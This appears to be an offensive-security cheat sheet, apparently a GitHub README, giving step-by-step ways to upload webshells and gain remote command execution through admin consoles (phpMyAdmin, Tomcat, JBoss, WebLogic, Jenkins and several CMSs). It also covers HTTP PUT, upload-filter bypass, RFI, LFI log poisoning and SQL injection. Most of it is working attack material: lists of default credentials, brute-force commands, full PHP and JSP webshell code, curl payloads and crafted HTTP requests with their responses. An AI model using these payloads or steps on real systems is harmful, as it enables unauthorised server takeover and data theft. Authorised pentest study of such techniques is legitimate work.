## Webshell upload techniques & Web RCE techniques

### Table of contents 

#### I. Classic Webshell upload techniques
- [Technique 1 - Webshell upload using a PHPMYADMIN Web console](#Technique-1-Webshell-upload-using-a-PHPMYADMIN-Web-console)
- [Technique 2 - Webshell upload using an APACHE TOMCAT manager Web console](#Technique-2-Webshell-upload-using-an-APACHE-TOMCAT-manager-Web-console)
- [Technique 3 - Webshell upload using a JBOSS administration JMX Web console](#Technique-3-Webshell-upload-using-a-JBOSS-administration-JMX-Web-console)
- [Technique 4 - Webshell upload using a WEBLOGIC administration console](#Technique-4-Webshell-upload-using-a-WEBLOGIC-administration-console)
- [Technique 5 - Webshell upload using a SPLUNK Web administration console](#Technique-5-Webshell-upload-using-a-SPLUNK-administration-console)
- [Technique 6- Webshell upload using a JIRA Web administration console](#Technique-6-Webshell-upload-using-a-JIRA-administration-console)
- [Technique 7 - Webshell upload using a WORDPRESS CMS Website admin console](#Technique-7-Webshell-upload-using-a-WORDPRESS-CMS-Website-admin-console)
- [Technique 8 - Webshell upload using a DRUPAL CMS Website admin console](#Technique-8-Webshell-upload-using-a-DRUPAL-CMS-Website-admin-console)
- [Technique 9 - Webshell upload using a KENTICO CMS Website admin console](#Technique-9-Webshell-upload-using-a-KENTICO-CMS-Website-admin-console)
- [Technique 10 - Webshell upload using a DNN (DotNetNuke) CMS Website admin console](#Technique-10-Webshell-upload-using-a-DotNetNuke-DNN-CMS-Website-admin-console)
- [Technique 11 - Webshell upload using a JOOMLA CMS Website admin console](#Technique-11-Webshell-upload-using-a-JOOMLA-CMS-Website-admin-console)
- [Technique 12 - Webshell upload by exploiting an insecure (writable) file share (FTP/CIFS/SAMBA/NFS) of a Web server root directory](#Technique-12-Webshell-upload-by-exploiting-an-insecure-writable-file-share-of-a-Web-server-root-directory)
- [Technique 13 - Webshell upload by abusing the insecure HTTP PUT method (Webdav)](#Technique-13-Webshell-upload-by-abusing-the-insecure-HTTP-PUT-method)
- [Technique 14 - Webshell upload by exploiting a vulnerable file upload function](#Technique-14-Webshell-upload-by-exploiting-a-vulnerable-file-upload-function)
- [Technique 15 - Webshell upload by exploiting a remote file include (RFI) vulnerability](#Technique-15-Webshell-upload-by-exploiting-a-remote-file-include-RFI-vulnerability)
- [Technique 16 - Webshell upload by exploiting a local file include (LFI) vulnerability](#Technique-16-Webshell-upload-by-exploiting-a-local-file-include-LFI-vulnerability)
- [Technique 17 - Webshell upload by exploiting a SQL injection (SQLi) vulnerability](#Technique-17-Webshell-upload-by-exploiting-a-SQL-injection-SQLi-vulnerability)
- Technique 18 - Webshell upload by exploiting a remote OS command execution vulnerability
- Technique 19 - Webshell upload by exploiting a remote code execution (RCE) vulnerability (e.g. insecure deserialization, )
- Technique 20 - Webshell upload by exploiting an insecure CKEditor (WYSIWYG HTML Editor with Collaborative Rich Text Editing)
- ...

#### II. Classic Web RCE techniques
- [Technique 1 - RCE using an IBM Domino Web administration console](#Technique-1-RCE-using-an-IBM-Domino-Web-administration-console)
- [Technique 2 - RCE using a Jenkins web-based groovy script console](#Technique-2-RCE-using-a-Jenkins-web-based-groovy-script-console)
- [Technique 3 - RCE using a Liferay CMS web-based groovy script console](#Technique-3-RCE-using-a-Liferay-CMS-web-based-groovy-script-console)
- Technique 4. ...

#### III. List of common paths for the DocumentRoot directory (Web root directory) [LINK](#III-List-of-common-paths-for-the-DocumentRoot-directory-Web-root-directory)
#### IV. Usefull Github links for Webshells [LINK](#IV-Usefull-Github-links-for-Webshells)
#### V. Quickly set up a test environment using Docker [LINK](#V-Quickly-set-up-a-test-environment-using-Docker)

-----------------

### I. Classic Webshell upload techniques
#### Technique 1. Webshell upload using a PHPMYADMIN Web console
```
➤ Step 1. Log into the PHPMyAdmin Web console by exploiting the presence of default or easy guessable credentials,
	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
           - URL: http://x.x.x.x/phpmyadmin or http://x.x.x.x/website-name/phpmyadmin)
           - Default or weak credentials: root:root, root and empty password
	  
➤ Step 2. Find or guess the Web server installation path (DocumenRoot) Web root folder (e.g., it can be found thanks to "http://x.x.x.x/<path>/phpinfo.php").
           - Example for Windows - XAMP = 'C:\XAMPP\htdocs\' or 'C:\XAMPP\htdocs\<website-name>\'
           - Example for Linux   - LAMP = '/var/www/' or '/var/www/https/<website-name>/wp-content/uploads/', etc ... 
  
➤ Step 3. In the PHPMyAdmin Web console,  go to the SQL query browser then:
           - Type and execute the following SQL query to display OS files (it depends of the right of the account running the PHPMyAdmin console)
             + Linux server   - "SELECT LOAD_FILE('/etc/passwd');"
             + Windows server - "SELECT LOAD_FILE('C:\Windows\system.ini');"
           - Type and execute the following SQL query to write a PHP Webshell in the Web root folder
             + Linux server   - "select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/b<website-name>/wp-content/uploads/Webshell.php";"
             + Windows server - "select "< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >" into outfile "C:\\XAMPP\\htdocs\\<website-name>\\Webshell.php";"

➤ Step 4. Access to the 'Webshell.php' file with your web browser and execute OS commands
           Examples:
           - http://x.x.x.x/<website-name>/wp-content/uploads/Webshell.php?cmd=whoami
           - http://x.x.x.x/<website-name>/Webshell.php?cmd=whoami

Note: Several PHP functions can be used in a webshell to execute OS commands
           Examples:
           + shell_exec() function: <?php echo shell_exec($_GET['cmd']); ?>
           + system() function: <?php system($_GET['cmd']); ?>
           + passthru() function: <?php echo passthru($_GET['cmd']); ?>
           + exec() function: <?php echo exec($_POST['cmd']); ?>
```

#### Technique 2. Webshell upload using an APACHE TOMCAT manager Web console
```
➤ Step 1. Log into the Tomcat manager Web console by exploiting the presence of default or easy guessable credentials,
	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy or Metasploit (use auxiliary/scanner/http/tomcat_mgr_login)
	   - URL: http://x.x.x.x/:8080/manager/html or http://x.x.x.x/website-name/manager, ...)
	   - Default or weak credentials: tomcat:tomcat, tomcat:manager, manager:manager, admin:manager, xampp:xampp, ...
	  
➤ Step 2. Upload and deploy your WAR file 
           (i.e. "Select WAR file to upload" and then click on the "Deploy" button)

➤ Step 3. Then go to the application section to see the details about your new deployed application (e.g. path, start/stop/reload/undeploy buttons etc.)

➤ Step 4. Execute OS commands using the Webshell 
           - Examples: 
	     + http://target_IP:port/<path>/webshell.jsp?cmd=whoami
	     + http://target_IP:port/webshell/webshell.jsp?cmd=whoami
```
 
##### <i>Example - How to create a WAR file</i>
```
1. Choose a Web shell (.jsp)

	<%@ page import="java.util.*,java.io.*"%>
	<%
	%>
	<HTML>
	<TITLE>JSP Shell</TITLE>
	<BODY>
	Note: Against Windows you may need to prefix your command with cmd.exe /c
	</br></br>
	JSP Command:
	<FORM METHOD="GET" NAME="myform" ACTION="">
	<INPUT TYPE="text" NAME="cmd">
	<INPUT TYPE="submit" VALUE="Execute">
	</FORM>
	<PRE>
	<%
	if (request.getParameter("cmd") != null) {
	out.println("Command: " + request.getParameter("cmd") + "<BR>");
	Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
	OutputStream os = p.getOutputStream();
	InputStream in = p.getInputStream();
	DataInputStream dis = new DataInputStream(in);
	String disr = dis.readLine();
	while ( disr != null ) {
	out.println(disr);
	disr = dis.readLine();
	}
	}
	%>
	</PRE>
	</BODY>
	</HTML>

2. Generate a WAR file with the web shell : "jar -cvf webshell.war webshell.jsp"
3. Upload the WAR file to a Web server such as Tomcat, Websphere, Weblogic, JBoss etc.
```


#### Technique 3. Webshell upload using a JBOSS administration JMX Web console
```
Example 1
---------
➤ Step 1. Log into the JBoss JMX console by exploiting the presence of default or easy guessable credentials,
	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy
	   - Default or weak credentials: admin:admin, sysadmin:sysadmin, ...
	   - Examples of URL:
	     + https://x.x.x.x:9990/console
	     + https://x.x.x.x:8090/jmx-console/
	     + https://x.x.x.x:8080/jmx-console/
	     + https://x.x.x.x:8080/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
	     + https://x.x.x.x:8080/web-console/ServerInfo.jsp
	     + https://x.x.x.x:8080/invoker/JMXInvokerServlet
	     + https://x.x.x.x:8080/admin-console/
	    
➤ Step 2. Create a WAR file (e.g., webshell.war) with a jsp webshell and host it in a publicly available web server (python -m SimpleHTTPServer 80)
	  
➤ Step 3. On to the JMX Console, browse the URL below and type in the ObjectName filter field "*:service=MainDeployer" 
           then click on “service=MainDeployer”
	   - https://x.x.x.x:8080/jmx-console/HtmlAdaptor?action=displayMBeans

➤ Step 4. Use the “void deploy()” function to deploy a WAR file
	   - Enter the IP address of the Web server and the name of your WAR file in the URL box (in the "ParamValue" field) 
	     + example: x.x.x.x/webshell.war 
	   - Then click the “Invoke” button
	   - The web server should display the message "Operation completed successfully with a return value" 

➤ Step 5.  Execute OS commands using the Webshell 
           - Examples: 
	     + http://x.x.x.x:8080/webshell/webshell.jsp?cmd=whoami&html=true
	     + http://x.x.x.x:9090/webshell/webshell.jsp?cmd=whoami
```
```
Example 2
---------
➤ Step 1. On the command line, type the following cURL request (wrapped for better readability) to deploy a WAR file using the JMX Console:
           $ curl ’http://x.x.x.x:8080/jmx-console/HtmlAdaptor
           ?action=invokeOpByName
           &name=jboss.admin%3Aservice%3DDeploymentFileRepository
           &methodName=store
           &argType=java.lang.String
           &arg0=shell.war
           &argType=java.lang.String
           &arg1=shell
           &argType=java.lang.String
           &arg2=.jsp
           &argType=java.lang.String
           &arg3=%3C%25Runtime.getRuntime%28%29.exec%28request.
           getParameter%28%22c%22%29%29%3B%25%3E%0A
           &argType=boolean
           &arg4=True’

➤ Step 2. Afterwards, arbitrary commands can be run on the host system. 
           Examples:
           - $ curl ’http://x.x.x.x:8080/shell/shell.jsp?c=touch%20%2ftmp%2ftest.txt’
           - $ curl ’http://x.x.x.x:8080/shell/shell.jsp?c=whoami’
  
Other manual Webshell upload technique: https://securitysynapse.blogspot.com/2013/08/manually-exploiting-jboss-jmx-console.html
```

#### Technique 4. Webshell upload using a WEBLOGIC administration console
```
➤ Step 1. Log into the Weblogic admin console by exploiting the presence of default or easy guessable credentials,
	   anonymous access or by performing a brute-force or dictionnary password attack using Burp proxy 
           - URL should be something like: "http:\\<Admin_server_IP>:<AdminServerPort>/console" or "https:\\x.x.x.x:7001/console", ...
           - Default or weak credentials: weblogic:weblogic, weblogic/weblogic1, weblogic/welcome1, system/Passw0rd (for Weblogic Server 11g), system/password, system/weblogic, ...
  
➤ Step 2. From the tree-structure in the left panel, choose the Web Applications node under the Deployments node. 
           Then, click on the Configure a new Web Application link in the left pane to begin the deployment of yout 'Webshell.war' application.
	  
➤ Step 3. To proceed, click on the upload it through the browser link in the right panel.
           Use the "Browse" button to locate your war file and click the "Upload" button to upload it.

➤ Step 4. At the bottom of the right panel, you will find displayed the name of the file that was just uploaded 
           i.e., your 'webshell.war' – preceded by a [select] link. This is a clear indicator of the success of the upload process. 
	   To complete the deployment however, you will have to associate the deployed war file with one or more WebLogic server instances as you deem necessary. 
           To achieve this, click on the [select] hyperlink that precedes the webshell.war entry.
	  
➤ Step 5. The Available Servers list in the right panel will list all the available WebLogic server instances. 
           From this list, choose the instances on which the egurkha application is to be deployed.
           Then, click on the –> button to transfer the selection to the Target Servers list.
           Finally, deploy the webshell application on the Target Servers by clicking on the Configure and Deploy button
	  
➤ Step 6. Once the deployment completes and is successful, the Deployment Status section in the right panel will display true against each of the target servers.
           Similarly, the Deployment Activity section will display the Completed status for each of the target servers. 
           On the contrary, if the Deployment Status is false and the Deployment Activity is “Running…”, it indicates that deployment is ‘in progress’. 
           In such a case, wait until the status changes.
	  
➤ Step 7. Execute OS commands using the Webshell 
           - Example: http://target_IP/<path>/webshell.jsp?cmd=whoami
```
#### Technique 5. Webshell upload using a SPLUNK web administration console
```
➤ Step 1. Download a Webshell customized for Splunk
	   - https://github.com/dionach/Splunk-Web-Shell
	   - https://github.com/TBGSecurity/splunk_shells

➤ Step 2. Log into the administrator portal of a Splunk instance (e.g. admin access is uncredentialed or default creds 'admin:changeme' have not been changed)
	   - http://IP-splunk:8000/ or  https://IP-splunk:8000/ 

➤ Step 3. To deploy the Webshell you have to:
	   - browse to "Manage Apps" and then click on "Install app from file", 
	   - click on "Choose File", select the "webShell.tar.gz" file and click on "Upload"
	   - click on "Restart Splunk"
	   - browse the new app (your Webshell)
```

#### Technique 6. Webshell upload using a JIRA Web administration console
```
➤ Step 1. Download a Webshell customized for Jira
	   - https://github.com/dubfr33/atlassian-webshell-plugin

➤ Step 2. Log into a Jira instance as an administrator (e.g. default admin creds 'admin:admin' have not been changed)
	   - http://IP-or-Url/login.jsp or https://IP-or-Url/login.jsp 

➤ Step 3. To deploy the Webshell you have to:
	   - browse the upload page "https://IP-or-Url/plugins/servlet/upm"
	   - then upload the Webshell plugin "atlassian-webshell-plugin\atlplug.jar"
	   - finally access the Webshell to execute system command "https://IP-or-Url/plugins/servlet/com.jsos.shell/ShellServlet"
```
#### Technique 7. Webshell upload using a WORDPRESS CMS Website admin console
##### <i/>If you have admin privileges over a CMS such as WordPress, Kentico, DotNetNuke, Drupal, Joomla [...] then you can upload a webshell and execute OS commands.</i>
``` 
➤ Step 1. Enumerate WordPress users or Guess the Wordpress admin's login  
           - root@kali:~/# wpscan --url http://x.x.x.x.x --enumerate p,u,t,tt)
  
➤ Step 2. Perform a bruteforce or dictionnary password attack 
           - root@kali:~/# wpscan --url http://x.x.x.x.x --wp-content-dir /wp-login.php --wordlist /root/Desktop/<path>/wordlist.dic --username admin
  
➤ Step 3. Log into the WorPress admin console 
           URL examples:
           - http://x.x.x.x/wp-login.php
           - http://x.x.x.x/wp-admin
           - http://x.x.x.x/admin
           - http://x.x.x.x/login
  
➤ Step 4. Upload of a Webshell 
          - Method 1 - Add a PHP webshell by editing a theme php page and adding the code of a PHP webshell (e.g. 404 error page)
                       Go to 'Apparances' and then 'Editor' to edit a PHP page with a webshell or a reverseshell

          - Method 2 - Upload of a PHP webshell by using the WordPress plugin upload page
	               Examples:
	               + Go to 'https://website/wordpress-blog/wp-admin/plugin-install.php?tab=upload'
	               + Then upload a PHP webshell (and not a zip file) 
	               + Finally browse the webshell and execute OS commands
	                 > Https://website/wordpress-blog/wp-content/uploads/webshell.php?cmd=whoami
```

#### Technique 8. Webshell upload using a DRUPAL CMS Website admin console
``` 
➤ Step 1. Log into the Drupal CMS website as admin (to have the privilege to install new modules)
➤ Step 2. Click on the "Extend" tab and go to install new theme page (e.g. http://www.example.com/admin/modules/install)
➤ Step 3. Create a directory with 3 files in it: a PHP shell, a module info and a htaccess file.
➤ Step 4. Create a tarball of the directory (e.g. drupal_rce.tar.gz)
➤ Step 5. Browse the tarball and upload it in the install module section
➤ Step 6. Install the module
➤ Step 7. Now visit the module page and execute OS commands via your webshell (e.g. http://www.example.com/modules/[module name]/webshell.php?cmd=whoami)
```

#### Technique 9. Webshell upload using a KENTICO CMS Website admin console
``` 
➤ Step 1. Log into the Kentico admin console (e.g. http://mysite.com/admin)
➤ Step 2. Edit the list file extensions allowed to add '.asp' and '.aspx'
➤ Step 3. upload a '.aspx' or '.asp' webshell using the CMS native upoad file function
➤ Step 4. Now browse the webshell that you uploaded and execute OS commands
```

#### Technique 10. Webshell upload using a DotNetNuke DNN CMS Website admin console
``` 
➤ Step 1. Log into the DotNetNuke CMS website as administrator
➤ Step 2. Go to "In Settings -> Security -> More -> More Security Settings" and add new allowed file extensions under "Allowable File Extensions"
           (i.e. add asp or aspx, and then click on the Save button).
➤ Step 3. Then go to "/admin/file-management" and upload an asp webshell (e.g. webshell.asp).
➤ Step 4. Finally, browse the page "/Portals/0/webshell.asp" to access your webshell and execute OS commands.
``` 
#### Technique 11. Webshell upload using a JOOMLA CMS Website admin console
``` 
➤ Step 1. Log into the JOOMLA CMS website as administrator
          URL examples:
           - https://mysite.com/administrator
           - https://mysite.com/administrator/index.php?option=com_login

➤ Step 2. Go into the System Dashboard i.e. in the left panel, click on "System"

➤ Step 3. Then click on the button "Extensions" in the "Install" section

➤ Step 4. Upload and install a new Joomla extension which is Zip file containing your PHP webshell
          - Exemple of Joomla webshell plugin: https://github.com/p0dalirius/Joomla-webshell-plugin

➤ Step 5. Finally, browse the page below to access your webshell and execute OS commands
          URL examples:
          - http://mysite.com/modules/mod_webshell/mod_webshell.php?action=exec&cmd=whoami
          - http://mysite.com/modules/mod_webshell/mod_webshell.php?action=download&path=/etc/passwd

``` 

#### Technique 12. Webshell upload by exploiting an insecure writable file share of a Web server root directory
##### <i>Common Web server root directory = 'C:\inetpub\wwwroot\' or '/var/www/'. Potential insecure writable file share = FTP file share or CIFS/SMB file share or SAMBA file share or NFS file share ... </i> 
```
Example
➤ Step 1. Identify a file share of a Web server that is insecurely granting read & write permissions to all "Domain Users" over the folder 'C:\inetpub\wwwroot\'

➤ Step 2. Upload a webshell (.ASP or ASPX) in the folder 'C:\inetpub\wwwroot\' or 'C:\inetpub\wwwroot\application-name\'

➤ Step 3. Browse your webshell and execute OS commands 
           Examples:
           - "http://x.x.x.x/Webshell.asp" 
           - "http://x.x.x.x/application-name/Webshell.aspx" 
```

#### Technique 13. Webshell upload by abusing the insecure HTTP PUT method
<i/> Note: The HTTP PUT method is also known as one of the Webdav methods </i>
```
➤ Step 1. Find an insecure Web server which accepts PUT HTTP method
	   - Examples with CURL
             root@kali:~# curl -v -X OPTIONS http://x.x.x.x/test/
             * Trying x.x.x.x...
             * TCP_NODELAY set
             * Connected to x.x.x.x (x.x.x.x) port 80 (#0)
             > OPTIONS /test/ HTTP/1.1
             > Host: x.x.x.x
             > User-Agent: curl/7.60.0
             > Accept: */*

	     HTTP response:
	     --------------
             < HTTP/1.1 200 OK
             < DAV: 1,2
             < MS-Author-Via: DAV
             < Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK
             < Allow: OPTIONS, GET, HEAD, POST
             < Content-Length: 0
             < Date: Wed, 15 Aug 2018 21:35:07 GMT
             < Server: lighttpd/1.4.28
             < 
             * Connection #0 to host x.x.x.x left intact
		 
➤ Step 2. Try to upload a simple text file with curl 
           - curl -T test.txt http://www.sitename.com/foldername

➤ Step 3. If the text file was uploaded successfully, then upload a Webshell file
	   - Examples with CURL
             $ curl -T webshell.jsp http://www.sitename.com/<path>
             $ curl -T webshell.asp http://www.sitename.com/<path>
             $ curl -T webshell.aspx http://www.sitename.com/<path>
             $ curl -T webshell.php http://www.sitename.com/<path>
	    
	   - Example of HTTP PUT request sent with Burp proxy (repeater)	  
             PUT /test/webshell.php HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
             Accept-Language: en-US,en;q=0.5
             Accept-Encoding: gzip, deflate
             Connection: close
             Upgrade-Insecure-Requests: 1
             Cache-Control: max-age=0
             Content-Length: 49

             <?php echo shell_exec("id;pwd;uname -a;2>&1"); ?>
	    
	     HTTP response:
	     --------------
             HTTP/1.1 201 Created
             Content-Length: 0
             Connection: close
             Date: Wed, 15 Aug 2018 19:38:26 GMT
             Server: lighttpd/1.4.28

➤ Step 4. Execute OS commands using the Webshell 
	   - Examples with CURL
             $ http://www.sitename.com/<path>/webshell.php?cmd=whoami
             $ http://www.sitename.com/<path>/webshell.jsp?cmd=whoami
             $ http://www.sitename.com/<path>/webshell.asp?cmd=whoami
	     ...
	  
	   - Example of exploitation with Burp proxy (repeater)
             GET /test/webshell.php HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
             Accept-Language: en-US,en;q=0.5
             Accept-Encoding: gzip, deflate
             Connection: close
             Upgrade-Insecure-Requests: 1
             Cache-Control: max-age=0
	    
	     HTTP response:
	     --------------
             HTTP/1.1 200 OK
             X-Powered-By: PHP/5.3.10-1ubuntu3.21
             Content-type: text/html
             <SNIP>
             uid=33(www-data) gid=33(www-data) groups=33(www-data)
             /var/www/test
             <SNIP>
```

#### Technique 14. Webshell upload by exploiting a vulnerable file upload function
```
Example with a vulnerable PHP website

➤ Step 1. You found a file upload page "image_upload.php" and you tried to upload a webshell named "Webshell.php" but it was rejected.
          Possible root causes:
	   - only the file name extensions '.png', '.gif' and '.jpg' are accepted
	   or
	   - the file name extension '.php' is forbidden

➤ Step 2. Simply modify the file extension of your webshell like "Webshell.php.png" or "Webshell.php5" or "Webshell.phtml" to bypass the checks based on the file extension
           - In general to bypass basic checks you can do the following:
 	     + Append the name of the file extension of your webshell
	     + Adjust the content-type to match that of an accepted file-type
	     + Include magic bytes for an accepted file
	    
           - Using Burp proxy send the following POST HTTP request:
             POST /application/image_upload.php HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
             Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
             Accept-Language: en-US,en;q=0.5
             Accept-Encoding: gzip, deflate
             Referer: http://x.x.x.x/application/upload.php
             Cookie: PHPSESSID=4e2jkta5ovnligfe6bchjgsop5
             Connection: close
             Upgrade-Insecure-Requests: 1
             Content-Type: multipart/form-data; boundary=---------------------------9005578534749094731954750866
             Content-Length: 409

             -----------------------------9005578534749094731954750866
             Content-Disposition: form-data; name="fileToUpload"; filename="Webshell.php.png"
             Content-Type: application/x-php

             <?php echo shell_exec($_GET['cmd'].' 2>&1'); ?>

             -----------------------------9005578534749094731954750866
             Content-Disposition: form-data; name="submit"

             Upload Image
             -----------------------------9005578534749094731954750866--

             HTTP response:
	     --------------
             HTTP/1.1 302 Found
             <snip>
             location: main_login.php
             Content-Length: 104
             Connection: close
             Content-Type: text/html; charset=UTF-8

             <html>
             <body>
             Uploading, please wait<br />The file has been uploaded to /uploads <br /></body>
             </html>

➤ Step 3. Browse your webshell and execute OS commands 
           - Using Burp proxy send the following POST HTTP request:
             GET /application/uploads/Webshell.php.png?cmd=id HTTP/1.1
             Host: x.x.x.x
             User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0

             HTTP response:
	     --------------
             HTTP/1.1 200 OK
             <SNIP>
             Connection: close
             Content-Type: text/html; charset=UTF-8

             uid=48(apache) gid=48(apache) groups=48(apache)
```

#### Technique 15. Webshell upload by exploiting a remote file include (RFI) vulnerability
```
Example
➤ Step 1. Review the content (php settings) of the page "/phpinfo.php" (e.g., identified with dirbuster)
     	   => allow_url_fopen   : On  => potential RFI
     	   => allow_url_include : On  => potential RFI	

➤ Step 2. Create a webshell and host it on a publicly available Web server
           Examples:
	   - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell.php
	   - jeff@kali:~/$ echo "<?php echo shell_exec('uname;whoami;id;pwd;ls');?>" > webshell
	   - jeff@kali:~/$ sudo python3 -m http.server 80

➤ Step 3. Find and exploit a Remote File Include (RFI) flaw using Burp proxy to execute OS commands with your webshell
           Example:
           - http://Website/index.php?p=http://x.x.x.x/webshell.php
	   - http://x.x.x.x/application/fileviewer.php?p=http://x.x.x.x/webshell
```

#### Technique 16. Webshell upload by exploiting a local file include (LFI) vulnerability
```
Example
➤ Step 1. You find a website during an internal penetration test that is vulnerable to a Local File Include vulnerability and you can read log files such as '/var/log/auth.log' and '/var/log/mail' thanks to the LFI flaw.
	   Examples:
	   > http://website/index.php?lang=../../../../var/log/auth.log
	   > http://website/index.php?lang=../../../../var/log/mail

➤ Step 2. Add a malicious PHP webshell in the log files '/var/log/auth.log' and '/var/log/mail', if you can attempt to log into the SSH server 
	   or if you can log anonymously into the SMTP server of the Linux server. 
 	   Examples:
	   -[SSH] root@kali:~# ssh '<?php echo system($_GET["cmd"]); exit; ?>'@X.X.X.X
	   -[SMTP] root@kali:~# telnet X.X.X.X 25
 	                        Trying X.X.X.X...
 	                        Connected to X.X.X.X.
 	                        Escape character is '^]'.
 	                        220 straylight ESMTP Postfix (Debian/GNU)
 	                        FROM anonymous@straylight
 	                        502 5.5.2 Error: command not recognized
 	                        AIL FROM: anonymous@straylight
 	                        250 2.1.0 Ok
 	                        RCPT TO: <?php echo shell_exec("id;pwd;uname -a;2>&1"); ?>
 	                        501 5.1.3 Bad recipient address syntax

➤ Step 3. Execute the PHP Webshell stored in the log files '/var/log/auth.log' and '/var/log/mail' via via the Local File Include vulnerability. 
	   Examples:
	   > http://website/index.php?lang=../../../../var/log/auth.log&cmd=whoami
	     + HTTP response:  uid=33(www-data) gid=33(www-data) groups=33(www-data)
	     
	   > http://website/index.php?lang=../../../../var/log/mail
	     + HTTP response containg the result of our OS commands:
	       <html>
	       <SNIP>
	       Aug 23 18:45:28 straylight postfix/smtpd[2886]: connect from unknown[X.X.X.X]
	       Aug 23 18:46:36 straylight postfix/smtpd[2886]: warning: Illegal address syntax from unknown[X.X.X.X] in RCPT command: 
	       uid=33(www-data) gid=33(www-data) groups=33(www-data)
	       /var/www/html/
	       Linux server01 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64 GNU/Linux
	       <SNIP>
```

#### Technique 17. Webshell upload by exploiting a SQL injection (SQLi) vulnerability

```
Example
➤ Step 1. Find a SQL injection vulnerability on a PHP website. The following pre-requites must be met:
  	  - the underlying MySQL database is installed on the same server than the Website
  	  - the Website is using a database account that has admin privileges over the MySQL database
	  
➤ Step 2. Find or guess the Web server installation path (DocumenRoot) Web root folder (e.g., it can be found thanks to "http://x.x.x.x/<path>/phpinfo.php").
  	  - Example for Windows - XAMP = 'C:\XAMPP\htdocs\' or 'C:\XAMPP\htdocs\<website-name>\'
    	  - Example for Linux   - LAMP = '/var/www/' or '/var/www/https/<website-name>/wp-content/uploads/', etc ... 
  
➤ Step 3. Using the SQL injection vulnerability, execute the following SQL query to write the Webshell in the Web root folder of the server
  	  Examples: 
	  - Linux server   - "select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/<website-name>/uploads/Webshell.php";"
	  - Windows server - "select "< ? $c = $_GET['cmd']; $op = shell_exec($c); echo $op ? >" into outfile "C:\\XAMPP\\htdocs\\<website-name>\\Webshell.php";"

➤ Step 4. Access to the 'Webshell.php' file with your web browser and execute OS commands
          Examples:
          - http://x.x.x.x/<website-name>/uploads/Webshell.php?cmd=whoami
          - http://x.x.x.x/<website-name>/Webshell.php?cmd=whoami

Note: Several PHP functions can be used in a webshell to execute OS commands such as
+ shell_exec() function: <?php echo shell_exec($_GET['cmd']); ?>
+ system() function: <?php system($_GET['cmd']); ?>
+ passthru() function: <?php echo passthru($_GET['cmd']); ?>
+ exec() function: <?php echo exec($_POST['cmd']); ?>
```

-----------------

### II. Classic Web RCE techniques
#### Technique 1. RCE using an IBM Domino Web administration console
```
➤ Step 1. Log into the IBM Domino Web Administrator console and browse the Web Administrator database named "webadmin.nsf"
	   - https://target-IP-or-Url/webadmin.nsf
➤ Step 2. Click on "Server" and then "Status" 
➤ Step 3. Select "Quick Console" (or "Live Console")
➤ Step 4. Enter the OS command with any arguments directly in the "Domino Command" box and then click "Send"
```

#### Technique 2. RCE using a Jenkins web-based groovy script console
```
➤ Step 1. Log into a Jenkins Web console with admin privileges (e.g. admin access is uncredentialed or whith default admin credentials 'admin:password' have not been changed)

➤ Step 2. Browse the Jenkins web-based groovy script console that allows to execute OS commands on the underlying Windows server.
	   - https://target-IP-or-Url-of-Jenkins-Website/script

➤ Step 3. Execute OS command using the groovy script console in jenkins
           Basic examples:
	   - print "cmd /c whoami >> C:\\Temp\\test.txt".execute().text   	//for a Windows server
	   - print "ls /".execute().text					//for a Linux server
```

#### Technique 3. RCE using a Liferay CMS web-based groovy script console
```
➤ Step 1. Log into a Liferay CMS Web portal with admin privileges (e.g. default admin credentials 'test@liferay.com:test')

➤ Step 2. Browse the Liferay web-based groovy script console that allows to execute OS commands on the underlying server (windows or linux).
	   - Location: Control Panel > Server Administration > Script
	   - URL: https://LIFERY-CMS-URL/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script

➤ Step 3. Execute OS command using the groovy script console
           - Basic example of code to enter in the groovy script box to execute the 'whoami' command if the Liferay is running on a Linux server
		def sout = new StringBuilder(), serr = new StringBuilder()
		def proc = 'whoami'.execute()
		proc.consumeProcessOutput(sout, serr)
		proc.waitForOrKill(1000)
		println "out> $sout err> $serr"
```

-----------------

### III. List of common paths for the DocumentRoot directory (Web root directory)
```
➤ XAMP (Windows) = "c:\XAMPP\htdocs"
➤ IIS (Windows) = "C:\inetpub\wwwroot"
➤ Websphere (Windows) = "c:/program files/ibm http server/htdocs" or "C:\WebSphere\IHS"
➤ Apache(Linux) = '/var/www' (configuration found in the file '/etc/httpd/conf/httpd.conf' or '/etc/apache2/sites-available/default')
➤ Apache(Linux) = "/var/www/html/example.com/"
➤ Apache(Unix) = “/usr/local/Apache2.2/htdocs”
➤ Apache(Windows) =  “C:/Program Files/Apache Software Foundation/Apache2.2/htdocs/”
➤ NGINX (Linux) = '/data/www' or '/data/w3' or "/usr/local/nginx/html' (configuration files can be found in the directory: '/usr/local/nginx/conf' or /etc/nginx' or '/usr/local/etc/nginx')
```

-----------------

### IV. Usefull Github links for Webshells

| Webshell | URL |
| :-----: | :-----: |
| All types | https://github.com/tennc/webshell |
